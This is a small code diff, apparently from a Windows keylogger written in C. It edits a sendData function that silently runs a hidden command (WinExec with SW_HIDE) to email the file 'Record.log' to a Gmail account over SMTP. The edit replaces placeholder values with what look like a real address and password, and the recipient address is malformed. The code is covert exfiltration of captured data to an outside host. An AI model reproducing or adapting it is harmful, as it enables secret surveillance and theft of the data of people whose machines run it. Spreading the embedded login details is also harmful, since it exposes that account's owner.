@@ -138,7 +138,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"your.email@gmail.com\" --mail-rcpt \"your.email@gmail.com\" --ssl -u your.email@gmail.com:password -T \"Record.log\" -k --anyauth";
+    char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"thejamesbond64@gmail.com\" --mail-rcpt \"thejamesbond64gmail.com\" --ssl -u thejamesbond64@gmail.com:p@ssword1225 -T \"Record.log\" -k --anyauth";
     WinExec(command, SW_HIDE);
 }
 
